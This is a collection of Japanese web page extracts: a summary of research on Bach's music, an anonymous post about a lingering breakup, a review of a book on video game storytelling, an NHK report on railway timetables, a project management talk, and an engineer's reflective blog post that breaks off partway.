これらの分析により、バッハの作品は、情報量が豊富であるにもかかわらず、聴取者に対して効果的に情報を伝達し、予測可能で理解しやすい構造を持っていることが明らかになった。この研究結果は、バッハの音楽が単に美しいメロディや調和だけでなく、その背後にある情報理論的な構造によっても特徴づけられることを示した。

Source and Image Credits: Kulkarni, Suman and David, Sophia U. and Lynn, Christopher W. and Bassett, Dani S. Information content of note transitions in the music of J. S. Bach
Title: バッハの曲を数学的に分析　“情報量が多く効果的に伝達している”と判明　米研究者らが検証

Link: https://anond.hatelabo.jp/20240219010418
Content: 2年付き合ったメンヘラ彼女を引きずっている

「こんなに私のこと分かってくれた人他にいない」ってめちゃくちゃ依存されたし、連絡の管理や束縛もされてた

だけど当時はそれが全然苦にならないぐらい大事に思ってた

「どんな男の人より〇ちゃんが好き」

「法律で結婚できなくてもずっと一緒にいてね」と何度も言ってくれて、本気でその約束を生涯守る覚悟でいた

なのに

「男の人とお付き合いする事になりました」

「やっぱり普通の女の子の人生を生きたいです。ごめんなさい」

なんてLINEで突然振られてしまった

家庭環境が複雑だったり中学高校は人間関係がうまくいかなくて保健室登校だったり元カレに可哀想な目に遭わされて男性が信じられなくなった話は何度も聞かされていたので、事実メンヘラではあったけど理由があって病んでしまった子なんだとも納得していた

だから自分が幸せにするんだ、この子を支えてあげるのが自分の役目だと思っていた

結論、本人が望む形で幸せになって欲しかったので、引き留めてはいけないと判断した

今までのお礼と、新しい相手との幸せを祈っていることを伝え、さようならのメッセージを送り合った後に連絡先を消して死ぬほど泣いた

あれから何年も経っているし彼氏も何度か出来たけど全員うまくいかなかった

彼らは寂しいからと夜中に電話を何件もかけてくる事もないし、感情の起伏がおかしくなって泣きながら暴れたり掴みかかったり物を投げつけたりするような人も一人もいない

自分のことを本当に愛しているのか、一生裏切らないと誓えるかを納得するまで確認されるような問答や試し行動だって一度も発生しなかった

それが本来は普通のことだと自覚すればするほど

「それほど普通でないはずのこと全てが全く苦にならないほど大切にしたい守りたいと思っていたのだから、自分は本気で彼女が好きだったのだな」

と思い知らされる

そうすると付き合っていくうちに少しずつ「あの子の時に比べて自分は本気じゃないかもしれない」という気持ちの差異を見つけてしまい、いつも結局別れてしまう

今もふとした拍子に「ちゃんと元気に生きているかな、またごはんを食べなくなっていないかな」と思い出してしまう

もう会う事がないのはわかっているのに「今夜いきなり電話がかかってこないかな」なんて考えてしまった事は数え切れない

あの子よりも自分の方がよっぽど激重メンヘラになってしまった

ツイートシェア
Title: 2年付き合ったメンヘラ彼女を引きずっている 「こんなに私のこと分かってく..

Link: https://motz.hateblo.jp/entry/2024/02/19/014819
Content: ■2. Can a computer game make you cry?: Planetfall（1982）ーーゲームは「死」を描くことができるのか？ ・1982年、Trip Hawkins はエレクトロニック・アーツを設立した。*13エレクトロニック・アーツは、後にサードパーティ最大のゲーム開発会社となるスタジオである。彼らは「ゲームはアートである」というテーゼを推進するため、ある広告を出した。それが can a computer game make you cry? ・内容はこんなかんじ。「なぜ人は泣くのでしょうか？ なぜ笑ったり、愛したり、微笑んだりするのでしょうか？ 私たちの感情の試金石となるのは何なのか？ これまで、このような問いを立てるひとびとは、ソフトウェア会社を経営するような人たちではありませんでした。作家、フィルムメーカー、画家、音楽家などがその役目を負いました。彼らは伝統的な意味での芸術家なのです。私たちはその伝統を変えようとしています。私たちの会社の名前はエレクトロニック・アーツです。​」

・その年のうちに、Infocom（1979年設立）という小さな会社がその広告に挑戦するようなゲームを出した。 『Planetfall』である。 Planetfall（infocom）マジでテキストしかない。それがテキストアドベンチャー。 ・Planetfallのあらすじ。宇宙船事故に見舞われて不時着した惑星、そこには文明の痕跡があった。プレイヤーは現地文明滅亡の謎を追いつつ、脱出のための手段を探す。

・「『Planetfall』についてまず特筆すべきは、テキストベースのゲーム（第一章で言うところのテキスト・アドベンチャー）でありながら、当時のグラフィック志向のゲームを遥かに凌駕する環境ディテールや描写力を備えていることだ」*14「グラフィカルなゲームは、抽象的な環境しか正確に表象できなかった。実世界の場所をエミュレートしようとすると、平坦になりがちだった(ように見えた) 」

・『Planetfall』の特徴は、プレイヤーの死ぬ頻度の高さ。行動をミスると簡単に死ぬうえ、空腹状態と疫病（惑星の文明を死滅においやった原因）のふたつの障害も立ちはだかる。その容赦のない難易度は当時から有名だった。自然、プレイヤーはセーブ＆リロードを多用することになる。そのたびにナラティブ体験は中断を余儀なくされるため、著者曰く、「プレイヤーの死やセーブ、ロードが頻繁に発生するゲームでは、『純粋な』ナラティブ体験や不信の停止は不可能だ」。

・バリー・アトキンスは『More than a Game』（https://library.oapen.org/handle/20.500.12657/35033）という著作の中で、コンピューターゲームをテキストとして扱い、プレイヤーの死の問題に焦点を当てている。「アトキンスはビデオゲームの基本構造がプレイヤーのナラティブ体験と対立する、よくある状況のひとつを強調している。セーブとリロードはゲームの世界の中ではまったく意味をなさないが、（その外にいるプレイヤーにとっては）死の存在を説明するためには必要な機能である。プレイヤーに一つのライフしか与えないゲームは少数の熟練したプレイヤーしか完走できない。脚本化されたストーリーを語ろうとしたり、 幅広い観客を巻き込もうとする場合は、何らかのリトライ機能を許容しなければならない」。

・ゲーム的な挑戦の結果もたらされる死は、切れ目のないストーリーテリングを阻害する。このジレンマを解決するため、現代のゲームでは死の頻度を減らし、プレイヤーをより快適にする選択を取っている。

・『Planetfall』にはフロイドという有名なキャラがいる。途中で出会うロボットだ。プレイヤーのコンパニオンとして感情豊かに振る舞うオトボケキャラ。「フロイドの不思議な点、そしてNPCとして2番目に重要な突破口は、彼がプロットにまったく必要でないということだ」。「フロイドの存在は、そのキャラクターの魅力によってのみ正当化される」。

・「『Planetfall』はフロイドを、プレイヤーが愛情を感じるような、非常に好感の持てるキャラクターとして確立することに成功した。当然、彼は死ななければならず、 その死はゲーム史上初の（プレイヤーの）涙の記録となった」

・ゲームの後半、ゲームの進行に必要なアイテムを入手するため、フロイドはプレイヤーの囮になって致命傷を追う。そして、そのプレイヤーの腕の中でフロイドはけなげなセリフを吐きながら死（というか停止）する。感傷的で劇的な場面。

・デジタルメディア研究者であるジャネット・マレーも『Hamlet on the Holodeck』（邦題『デジタル・ストーリーテリング―電脳空間におけるナラティヴの未来形 』）の中で、フロイドの死に触れ『ゲームが挑戦的なパズルから、喚起的な演劇体験へと変化する......フロイドの死は、ゲームがパズルから表現力豊かな物語芸術へと進む道における小さなマイルストーンである』と述べている。

・「ゲームの分野では、このようなことはかつてなかったことであり、フロイドの死でプレイヤーが涙を流した例は数多くある」

・フロイドはクリア後に復活するのだが、それでもプレイヤーにショックを与えた。『Planetfall』はプレイヤーとの感情的な結びつき（本作の場合は親密さと喪失感）を与えられると証明した。それは（現在の欧米のゲームでは忘れられがちな）テキストと文章技術の勝利でもあった。

・80年代の終わりにインフォコムは解散。技術の進歩によりビデオゲームにグラフィックと音がつくようになった。「しかし、テキスト・アドベンチャーは死ななかった。1993年 、グラハム・ネルソンは、誰でもインタラクティブ・フィクションを制作できるプログラミング言語 inform を開発し、無料で配布した。多くの作家がこのフォーマットに群がり、インターネット上で次々と無料ゲームをリリースした。2000年代初頭、私はこうした人々の努力の成果を通して、インタラクティブ・フィクションというジャンルを知った。商業的なゲームのシナリオにいささか燃え尽き気味だった当時、これらのゲームは新鮮な息吹を与えてくれた」*15





■8. A LIVING WORLD: 『シェンムー』（1999）――「世界」を作り上げる技法 シェンムー（SEGA） ・『シェンムー』は発売当時、かなり激しい賛否両論をもって迎えられた。それはこの作品の革新性によるところが大きい。

・シェンムーはオープニングで主人公のライフサイズな人間としての限界、場所、時間（時刻）などの日常生活のリアルな要素が重視されていることが明示される。『ハーフライフ』とは逆で、リアリズムのゲーム。「暴力ではなく、社会的なつながりが父親の殺人事件を解決する鍵なのだ」。

・『シェンムー』はあらゆる細部から世界が構築される、”見るゲーム”。プロットやゲームプレイ（メカニクス）に重点を置く大多数のゲームとは一線を画している。

・開発者の鈴木裕は「FREE」というジャンルを提唱した。「Full Reactive Eyes Entertainment」の略。リードシステムプログラマーの平井武史は「開発当時にはなかった”なんでもできる”という感覚を想像し、作り上げること」が開発における最大の難関だったと証言している。

・『ハーフライフ』ではNPCとの実のある交流はほとんどなかったが、『シェンムー』はNPCとの交流についても力を入れている。200名以上の街の住民ひとりひとりに個性と声優が設定され、主人公は父親殺しの犯人を見つけるために彼らに聞き込みを行う。つまり、ささいな手がかりにかんする質問でもひとつあたり200名分の音声を収録する必要があったわけで、こうした一見「無駄」な労力がシェンムーのコンテンツを膨大にした。一方でひとつの捜査パートで聞き込みを行える人物の数には制限が設けられている（総当たりはできない）。

自然プレイヤーには「よく聞き込みを行うヒト」とそうではないヒトとの間で親しさの差が生じる。そうして、プレイヤーには自らの選択によって個人的な関係をNPCたちと築いていくことになる。

・もっとも会話内容自体は「知らない」とか「わからない」とかそっけなく無個性的なものも多かったため、あるゲームデザイナーは「ハムスターのほうが会話スキルが高い」などと揶揄し、そのプアさが没入感を阻害していると指摘した。ちなみにそうした制約を痛感していた『システム・ショック』や『グランド・セフト・オート３』などはNPCとの会話を切り捨てていた。

・こうしたNPCの会話スキル問題は『シェンムー』そのものインタラクション・デザインの欠陥というより、当時の技術的な制約の面によって生じたもの。開発者たちは大勢のNPCの会話を作り上げる困難さを認識しつつもあえて突っ込んでいき、ゲームの表現の可能性を拡張した。

・『シェンムー』のNPCをリアルに感じさせるのは、会話ではなくむしろ動きの面。当時のNPCはほとんど動かないことが多かったが、『シェンムー』ではそれぞれのNPCにスケジュールが与えられて、それにそってみな町中を歩き回る。個別には単純なものだが、それらが１００名以上にもなってくると、街ひとつを再現しているかのように錯覚され、世界に対する没入感が高められる。

・時間はプレイヤー中心ではない流れ方をしている。常に現実世界での五分ごとにゲーム内で約一時間が経過するといったペース。そして、その時間の枠組で、プレイヤーがなにもしなくても世界が回っていく。『シェンムー』というゲームにプレイするにはそうしたプロセスに参加する必要がある。

・ゲーム終盤では頻繁に本筋のプロットが停止し、「ストーリーがふたたび動き出す翌日まで暇を潰さなければならない」といった事態が起こる。そこでプレイヤーが街でできるアクティビティやミニゲームがたくさん用意されている*32。ただなにもせずにブラつくことも可能。しかし、この「余暇」が当時の多くのプレイヤーを激怒させた。代表的な意見としては『ニューヨーク・タイムズ』紙に寄稿したチャールズ・ヘロルドの「暇つぶしためのゲームをプレイするのであって、ゲームの中で暇を潰すためにゲームをプレイしているのではない」。一方で、ジャーナリストのトム・ビッセルのように「ゲームは楽しくなければならない、という考えはゲームという媒体が不幸な語源から抜け出せないために生まれた誤謬」だと指摘。「game」という単語はアイスランド語の「gaman」に由来し、「楽しい」という意味。しかし、ビデオゲームはいまやルーツである古い時代のアーケードゲームよりもはるかに幅広いインタラクティブ・メディアへと進化しているのだと。

・一方著者は「『シェンムー』が退屈なゲームであることは間違いない。だが、熱心なファンたちが存在するということは、多くのプレイヤーが『シェンムー』から「楽しい」以上のものを得たということでもある。彼らは、このゲームのリアリズムを好んだのだ」と肯定的に評価する。*33

・注釈における（著者自身も属している）ゲームジャーナリストへの見方が辛辣。「ゲームジャーナリストは商業的にリリースされる大作に対する評価において、驚くほど統一されている傾向がある。この傾向に対して、ほとんどのジャーナリストは、（映画などの）他メディアと比べてビデオゲーム、特にジャンルの枠を押し広げるような革新的な作品が出現した場合にそのことが明白にわかる客観的要素が含まれているから（だれにとってもその革新性を評価しやすいのだ）と主張する。だが、私自身はゲームジャーナリストたちは特に批評的でもなければ、内省的でもないと考えている」

・著者いわく、通常ゲームプレイは入念に構築された時間と空間を通じた体験に従属するが、『シェンムー』とは静寂と空間の実験であり、沈黙を利用してアクションとドラマの文脈を形作り、強化するのものである。

・他のゲームは常に刺激を最大化するように設計されているが、『シェンムー』でプレイヤーに与えられるのは豊かな世界を観察するための十分な時間である。そこにおいてプレイヤーの行動の選択に明確な優劣はなく、以前のゲームにはなかった自発性を作り上げている。

その精神は『GTA3』のようなオープンワールドに一定程度引き継がれたが、完全な後継者は今日（2012年時点）に至るまで存在しない。*34





■11&12 Intertitle／Façade （2005）＆Dear Esther（2008）：インディーゲームの挑戦 ・インディーから次なる表現の萌芽を感じる２作品の短めの紹介。ひとつはAIによるダイアログの革新、もうひとつはウォーキングシム。どちらもたしかに2010〜20年代のゲームのトレンドになったもの。 ・Interactive Drama: Façade Façade ・4gamersの紹介：https://www.4gamer.net/weekly/kaito/041/kaito_041.shtml

・ヴァーチャル・ペット・ゲームである『Petz』シリーズ（1995〜2002）を制作したP.F.Magic社のデザイナー、アンドリュー・スターンの「動物だけでなく、人間とのコミュニケーションもヴァーチャル化したい」と考え、カーネギー・メロン大学の学者であるマイケル・マティアスと組んで制作したインタラクティブ・ドラマ。

・会話がダイアログツリー式ではなく、AIと〈ドラマ・マネージャー〉と呼ばれるプログラムによってダイナミックに進行していく。「インタラクティブ・ドラマ」ジャンルの最初期の作品。開発者によるとAIシステムはプレイヤーとのやり取りを7割程度しか理解できていないそうで、決して全面的に自由な会話ではないのだが、それでも自由さを錯覚させるだけの魅力を放つ瞬間が何度も訪れる。 ・Minimalism - Dear Esther Dear Esther（Chinese room） ・扱うのはオリジナルMOD版で、12年に出たリメイク版ではない。

・FPSゲームを研究しているダン・ピンチベックが「FPSからシューティング要素を抜いたらどうなるか？ プレイヤーを惹きつけるにはストーリーを語るしかないが、それはFPSのフォーマットで可能なのだろうか？」という疑問を抱き、そこから始まった実験作。

・ダイアログ主体のADVを作成することも可能だったが、それでは既存のADVの枠内で行われることとあまり変わらなくなる。そこでピンチベックは空間からNPCを排した。そして、シューティング要素を取り除いたことはオブジェクトの破壊や変化といった環境変化の要素も取り除くことへとつながった。

・「挑戦も戦闘もなく、『ミスト』のような難解なパズルに逆戻りすることもなく、彼にはゲームを進めるためのストーリーだけが残された。そして、肉体を持ったNPCがいなければ、正体不明のナレーターと環境そのものとの組み合わせによってのみ、物語は語られることになる」

・プレイヤーの注意力を求める在り方として一番近いのはラジオドラマ。

・ただノンリニアというだけではない。ほかのノンリニアなゲームもふつうは明確なエンディングを持つ。しかし本作はプレイ過程も曖昧なら結末も曖昧。

・「Dear Esther はおもしろくない。おもしろくしようさえしていない」

・「『Dear Esther』と『Façade』は、 どちらも不愉快な題材に取り組んでいる。ビデオゲームでは暴力や死はよく扱われるが、トラウマや鬱は扱われない」「『Façade』や『Dear Esther』のような短編ゲームは、ゲームデザインにおける重要な成長分野のひとつだと私は考えている。比較的安価であり、すぐに終わるとわかっていれば、人は自分の快適な領域から外れたもの、未知のクオリティのものにより積極的に取り組むものだ。最後に、このようなゲームは制作が早く、安価である。作り手と観客の双方にとって参入障壁を低くすることで、驚くほど新しいタイプのビデオゲーム 、ゲームデザインがあふれでる状況が整いつつある。うまくいけば、21世紀に入って業界が失った積極的なイノベーションを取り戻せるかもしれない。」*39

・本作は「ゲームであるかどうか」で大論争を巻き起こした。もっとも言われたのは「インタラクティブではないからゲームではない」*40

・「ゲームは競争をするもの」というゲーマー／非ゲーマーに広く浸透した意識を打ち破り、あたらしいゲームの可能性を開くものかもしれない。*41
Title: ビデオゲームにとってストーリーテリングとはなにか？――『A Mind Forever Voyaging: A History of Storytelling in Video Games』- Dylan Holmes - 最後の短篇企鵝の剥製

Link: https://www3.nhk.or.jp/news/html/20240219/k10014362961000.html
Content: このうち6つの路線を運行する「名古屋市営地下鉄」は、ダイヤの改正などに合わせて3つの路線については、3月までに駅のホーム上にある時刻表をすべて撤去することにしています。



駅の改札口付近などでは時刻表の掲示を続け、また、スマートフォンなどで時刻表を確認できるよう、ウェブサイトにつながるQRコードの掲示も進めています。



名古屋市交通局によりますと、ダイヤの改正などにあわせて新しい時刻表を掲示するための経費は、一つの路線で印刷代や人件費などあわせて、およそ数百万円かかるといいます。



名古屋市交通局営業本部電車部駅務課の丹羽孝夫さんは「乗客の数は回復傾向だが、コロナ禍前を下回り、さらに物価上昇で経費も増加していて経費削減が必要な状況だ」と話していました。



首都圏の「西武鉄道」でも、91の駅のうち88の駅でホーム上の時刻表を撤去しました。



▽次の列車を知らせる電光掲示板が設置されていることや

▽時刻表や列車の位置を確認できる自社のアプリが普及したことなどが背景にあるとしています。



ただ、スマートフォンを持たない乗客などには、窓口で紙に印刷した時刻表を無料で配布しているということです。



この会社でも、駅に掲示する時刻表の数は減らすものの、乗客の目にとまりやすい改札口や券売機の近くなどに、必ず一つは残すことにしています。



鉄道会社の間では、このほか

▽南海電鉄も一部の駅でQRコードでの案内を増やしているほか

▽東武鉄道やJR各社では、一部の駅で時刻表の掲示を減らしています。
Title: 駅の「時刻表」 集約やウェブサイトへの案内の動き広がる | NHK

Link: https://logmi.jp/business/articles/329992
Content: 日々の改善業務は「プロジェクト」ではない 小林：ちょっとここで質問なんですけれども、今日いらしてるお客さまの中で、「プロジェクトマネージャーという肩書きで仕事してるよ」という方はいらっしゃいますか？ 手を挙げてみてください。 （会場挙手） 10人ぐらい見えました。ちょっと少ないかもしれませんね。ところで初めに用語の確認をしておきますと、「プロジェクト」「プロジェクトマネジメント」「プロジェクトマネージャー」、この3つの単語を今日はさらっと紹介するんですけど、正しく理解できているでしょうか。 「プロジェクト？ 仕事のジャンルの1つだよね」「プロジェクトマネジメント？ まあ、その進め方？」「プロジェクトマネジャーって、なんか偉い人だろ。俺はまだ若手だしな」となるかもしれません。順番にご説明していきます。 「プロジェクト」。教科書的な説明ですと「独自性と有期性のある仕事」です。ラテン語では「前に投げる」という意味だそうです。例えば「2023年末までに新しいデジタルサービスを提供開始する」「11月から新しいSaaSを社内導入する」「kintoneを導入する」。 ポイントは期日が決まっている有期性。それから今までやったことがない、新しいものを導入する独自性。最近ではこういう不確実な新しいことをする人が増えてると思います。これがプロジェクトです。 一方でプロジェクトじゃない仕事の例。「オペレーション」って言うんですけど「毎日お店でお弁当を売る」とか「週に1回勉強会の講師をする」。ずっと繰り返すタイプのお仕事は、プロジェクトとは呼びません。 ところがよくある誤解として、チームの壁を越えたメンバーでやる仕事を、かっこつけて「プロジェクト」と言いがちなんですね。「改善プロジェクト」のように、期限なく改善を続けるような日々の改善業務はプロジェクトと呼ばないので気をつけてください。

プロジェクトは、ものによっては多少のミスが許される 小林：では続いて「プロジェクトマネジメント」とはどんな仕事でしょう。仕事の進め方はそうなんですけれども、「プロジェクトに期待されている価値を最大化するためのスキル」をプロジェクトマネジメントと言います。 マネジメントってかっこいい響きがあるんですけれども、一番近い日本語は「なんとかする」。プロジェクトをなんとか終わらせることがプロジェクトマネジメントという仕事です。 どんな仕事なのかと言うと、例えばタスクや進捗のチェックをするとか、プロジェクトのメンバーに情報伝達をする。それからお客さんからの「これもやってよ」という追加要求を断ったり、受け入れたり。それから関係者をうまく巻き込むのもプロジェクトマネジメントです。 よくあるのが、プロジェクトをちょっと学ぶと「品質・コスト・納期の3つが大事だよ」と言われるんです。大事だからもう全部完璧にするしかないよねって、めちゃくちゃ無理をしちゃうんですけれども、プロジェクトってものによっては多少のミスが許されるんです。 この3つを全部、うまく満たすことはかなり不可能です。なので優先順位をつけなきゃいけないんです。この優先順位をうまくつけるのが、プロジェクトマネジメントという仕事です。 ミスなく少ないコストで早くプロジェクトを完成させたいですけど、「早くすると品質が落ちますよ」とか「早くするにはちょっとお金がかかりますよ」という妥協をしながら進めていくお仕事です。

「プロジェクトマネージャー」という役割へのよくある誤解 小林：最後、「プロジェクトマネージャー」。プロジェクトの責任者、通称プロマネって呼ばれますけど、これはどんな人か。一番教科書的な説明になるんですけども「プロジェクトをなんとかまとめあげる人」がプロジェクトマネージャーです。 この人の仕事の9割はコミュニケーションと呼ばれたりします。でもよくある誤解として「偉いんでしょ」「権力者でしょ」「あらゆることに詳しいんでしょ」「業界もめちゃくちゃ長いんでしょ」と思われるかもしれません。 大企業でよくある、ABC社のシステム構築プロジェクトの体制図です。 IT部門のA部長がプロジェクトマネージャーとして体制図に君臨しています。そしてアプリチーム、インフラチーム、総務部、このメンバーをまとめあげるA部長がプロジェクトマネージャーです。 でもちょっと忙しいので、新人のBさんに事務局業務をやってもらいます。日程調整とか議事録の作成、会議の資料作成、請求書チェック。この時Bさんは雑用係と思われがちなんですけれども、プロジェクトをなんとか進めてるのは、実はBさんです。教科書的には、プロジェクトマネージャーはBさんなんです。 よくある誤解なんですけど、（役職は）別に偉い必要はないんです。人材マネージャーとちょっと似てるけど、ぜんぜん違う仕事です。あらゆる事項に精通してる必要もなくて、調整がうまければいいんです。そして業界も別に長い必要はありません。プロジェクトマネジメントって汎用的なスキルなので、業界は関係ありません。 今日この場に来てる方は、サイボウズ製品とか新しい製品を使って自分たちの会社、自分の仕事を良くしたいって考えてる方が多いんじゃないかと思っています。もしかしてみなさんは、無自覚にプロジェクトマネージャー的な仕事をされていたんじゃないでしょうか。 もう1回聞きますよ。この中に「さっき手を挙げなかったけど、やっぱり自分はプロジェクトマネージャーじゃないかな」って気づいちゃった方、いらっしゃいますか？ 手を挙げてみてください。 （会場挙手） 気持ち増えたかなというところですが、ちょっと話の展開上「倍ぐらいの人が手を挙げた」と認識しておきます（笑）。

プロジェクトマネジメントはセンスではなくスキル 小林：ここまできて気づいた方は、もしかするとあんまりプロジェクトマネジメントをマークしてなかったかもしれません。プロジェクトマネジメントは、しっかり体系の決まっているスキルです。スキルなので、学んで伸ばすことができます。 例えば案件の最後のほうに偉い人が来てちゃぶ台返しをしてきたり、現場の担当者がこっそり追加依頼してくるからついつい受け入れて、全体の整合性が崩れて遅延しちゃう。もしこの方がプロジェクトマネジメントの議論・理論である「ステークホルダー管理」「変更管理」というスキルを知っていれば、（そんな事態を）防げるかもしれません。 というわけでプロジェクトという言葉は、独自性と有期性がある仕事。プロジェクトマネージャーは、プロジェクトをなんとかまとめてゴールに誘導する役割。そしてセンスが必要なわけじゃなくて、学べる技術だということを覚えておいてください。 ここからは実際に現場でプロジェクトのマネジメントをされていた方をゲストにお招きして、お話を聞いていきます。ではここからバトンタッチして、現場の方にご登場いただきます。それではよろしくお願いします。

これからの時代はプロジェクトマネジメントのスキルが不可欠 高橋：じゃあ、なぜこれ（kintone導入支援）が成功したかと言うと、弊社はkintoneのアプリを作り倒しておりまして。右上にアプリを作った数が出てるんですが、最近数えたら4,700ぐらい作っております。ですので「たくさん作ってきたよ」ということと、もう1つが「ベースのスキルをちゃんと教えられる」というところだと思うんです。 プロジェクト管理、問題解決の研修を社内でしっかりやっていて、これをkintoneのプロジェクトの中でしっかり伝えているので、成功してるんじゃないかなと思っております。 （会場からの質問を見て）さっそくご質問をありがとうございます。社内で勉強会をやってるんですよ。問題解決研修というのをやって、What/Where/Why/Howっていう問題解決のフレームワークやロジックツリーの作り方、プロジェクトとは何かという話とか、WBS。 WBSは『ワールドビジネスサテライト』ではなくて（笑）。「Work Breakdown Structure」の略でございます。それからプロジェクトにおける時間管理とかコミュニケーションを社内でしっかり研修しております。 なんで社内の研修講師を自ら手を挙げてやったのかと言うと、理由は2つあって。1つは、これからはプロジェクトマネジメントのスキルは絶対に必要だからですね。高度経済成長期みたいな、10年先を見据える時代じゃないじゃないですか。今は世の中が見えないんですよ。 そうすると、プロジェクト型業務がどんどん会社の中で増えていきます。それを担える人材を育てなきゃいけないということと、私自身事業会社で10年以上仕事をする中で「なんちゃってプロジェクト」にいっぱい巻き込まれてですね。 笑っていただいてる方にはきっと共感されると思うんですけど、なんかプロジェクトって立ち上がるんですよ。「プロジェクトって何なんだろう」とよくわからなくなって自分で勉強して、自分の後ろを歩む人たちには同じ苦労をしてほしくないという思いで、勉強会をしております。

1人で進めた方が気楽なのに、なぜプロジェクトチームが必要なのか 高橋：ということで、ここからはその社内でやっている研修を一部抜粋しつつ、みなさんと一緒に考えていきたいと思います。ここからの時間は私が一方的に話すというよりは、みなさんと一緒に考えたいなと思っております。 立ち見のみなさんもありがとうございます。プロジェクトの疑問を一緒に考えていきたいなと思いますので、私から「こういうこと、どうですか」って問いかけをさせていただきます。みなさんもぜひご自身の経験とか自社のことを振り返っていただいて、そこから私なりの見解を伝えるという流れで進めていきたいと思います。 まず「プロジェクトでチームって何で必要なんですかね」という、この講演にケンカを売るような質問から始めてみたいと思うんですけど（笑）。プロジェクトってチームで進める必要があるじゃないですか。何でわざわざチームを組む必要があるんですかね。 1人で進めたほうが気楽じゃないですか。何でチームが必要なのか、みなさんの中にお答えはありますでしょうか。 私なりの答えで言うと、私もいっぱい悩んだんですよ。「たくさんいると大変だな」とか思ったんですけど、結論は「早く行きたければ1人で進め。遠くまで行きたければみんなで進め」という言葉かなと思います。これはアフリカの有名なことわざなんですが。 例えば近場の旅行だったら、プロジェクトチームを組む必要はないと思うんですよね。日帰りで1人でバーって行っちゃえばいいじゃないですか。でもみなさんが世界一周の船旅に出なきゃいけないってなったら、プロのコックさんとか欲しいですよね。みなさん『ワンピース』を見てますか？ ルフィはなぜコックを仲間にしたのか、遠くまで行くためですよね。 なので、こういうふうに自分自身に言い聞かせるようにしています。「チームを組むのは1人じゃ行けない所、遠くまで行くためなんだ」と。「1人では対処できないことをやるためには多くの力を借りなきゃいけないので、チームで挑むんだ」と自分自身に言い聞かせております。
Title: 「誰もやったことがないことを期限までにやれ」　無理ゲーなプロジェクトを任された時の「失敗」の考え方　

Link: https://dailyportalz.jp/kiji/want_to_ride_many_see-through_elevator
Content: デイリーポータルZのTwitterをフォローすると、あなたのタイムラインに「役には立たないけどなんかいい情報」がとどきます！

デイリーポータルZは、Amazonアソシエイト・プログラムに参加しています。
Title: 新宿シースルーエレベーター集め

Link: https://anond.hatelabo.jp/20240217191112
Content: いやお前、Z(ゼット)と書いておいてΖ(ゼータ)と読ませるのはおかしいだろ 見分けがつかないからって甘えんな 「ゼータ」で変換した文字Ζでページ内検索すればZ(ゼット)には引っかから...
Title: ZZ 最近の子供達はダブルゼータと読めないらしい。

Link: https://www.asahi.com/articles/ASS2L7SJRS2HUZPS006.html
Content: はてなブックマークでシェアする

Xでシェアする

Facebookでシェアする

メールでシェアする

です。 残り521文字 有料会員になると続きをお読みいただけます。 この記事は 有料記事 です。

※無料期間中に解約した場合、料金はかかりません
Title: 原発再稼働賛成50%　反対35%を上回る　朝日世論調査：朝日新聞デジタル

Link: https://nunulk-blog-to-kill-time.hatenablog.com/entry/50-yo-fullstack-engineer
Content: はじめに

この記事について

以下の記事を読んでわりと「うんうんわかるわかる」と思いながら読みましたが、50歳に至るまでの間にもうひとつ別の景色も見えてきていたので、そのあたりを一度言語化してみようという試みです。

note.com

フルスタックとは

上記記事へのブコメには「フルスタック」と書きましたが、自分としてはあまりフルスタックと名乗りたくない、という気持ちはありまして、普段は「ウェブアプリケーションエンジニア」と自称しています。 ただ、今回は、元の記事に合わせるために本記事における「フルスタック」の定義を定めておきます。

以下の領域の技術を理解し使える

インフラ アプリケーションが動作するサーバや協調するミドルウェア

バックエンド サーバーサイドのアプリケーションに用いる言語やライブラリ

フロントエンド クライアントサイドのアプリケーションに用いる言語やライブラリ



すべてを理解している必要はなくて、3つの領域それぞれに1つでも使えるものがあり、一人でアプリケーションを作り動かすことができれば「フルスタック（アプリケーション）エンジニア」と自称していいのではないか、というスタンスです。自分はウェブサービスに従事することが多いので、必然的にウェブアプリケーション関連の技術になりますが、モバイルクライアントを含む場合もあるでしょうし、あまりないとは思いますが、Firebase や Supabase あたりを主なバックエンドとして使うこともあるでしょう。しかしそれらはあくまでバリエーションであって「これができないとフルスタックとはいえない」という技術ではないかなと思っています。

技術領域（ハードスキル）

流行について

3つの領域すべてで、最新の情報をキャッチアップするのは無理になってきました（というか諦めつつある）。 「エンジニアに若いも若くないもない」というコメントもありましたが、個人的には年齢は間違いなく関係あると思っています。ただし、それは他者との比較ではなく過去の自分との比較です。元記事にも「若い頃の自分は〜」という記述もあるので、その視点は含まれているでしょう。

現在の視点から未来の視点を持つことは（若ければ若いほど）難しいと思います。年を取るにつれて（というより経験を積むにつれて）新規の技術や流行に対して昔ほど貪欲でなくなりました。いくつか例を挙げるとHotwire は出てわりとすぐ触りましたが htmx はまだ触ってません。Rust は最近使い始めましたが、去年からなのでだいぶ遅い部類でしょう。Go は自分には合わないと思うのでほとんど書いてませんし、仕事で使うつもりもいまのところありません。興味に任せて片っ端からやるのではなく、自分に合いそうか好きになれそうか、という視点でやる/やらないの判断するようになりました。そうした姿勢が選択の幅を狭めているともいえますし、効率が良くなったともいえると思います。

とはいえ、仕事で使う局面になったときにサッと使えるようにしておく、というのは大事だと思っていて、その辺の見極めもできるようになっておく必要があるので、とりあえず1回触っておくようにはしています。

具体例としては、DynamoDB、AWS Lambda、Next.js、辺りは実務で使う前にあるていど触っていたので、助かったです（その意味では、Go もいまの仕事で使うとなれば喜んで書くつもりではいます）。

その点、バックエンドは比較的安定してますね。どれか一つエキスパートレベルで使える言語やフレームワークがあれば（あとは SQL）、あまり流行を追う必要はなさそうです。

技術領域に関しては、イノベーター、アーリーアダプターである必要はありませんが、アーリーマジョリティーくらいの位置でいたいとは思います。

態度について

大事なことは、できないことはできないと自覚し、できる人の言うことを聞く、ということです。自分はフルスタックといえど、3つの中ではフロントエンドが苦手領域なので、チーム内に自分よりできるメンバーがいるときは弟子になったつもりで取り組むようにしていますし、得意な部分に関しても、自分がぜったい正しいとは思わないように、チーム内でのコミュニケーションは欠かさないようにはしています。

複数の選択肢があったとき、どれを採用するかは自分の得意不得意にかかわらず根拠を明確にしたいという気持ちがあって、得意な領域であればもちろん、不得意な領域に関しても不得意なりにそれぞれの選択肢についてその根拠に自分が納得できるかどうかは大事にしたいです。不得意であることをそのままにしておくのであれば、その領域には手を出さないほうがいいですし、やるからには常に上達できるように選択の根拠に限らず土台となるような部分を疎かにしないように心がけたいです。

非技術領域（ソフトスキル）

結婚について

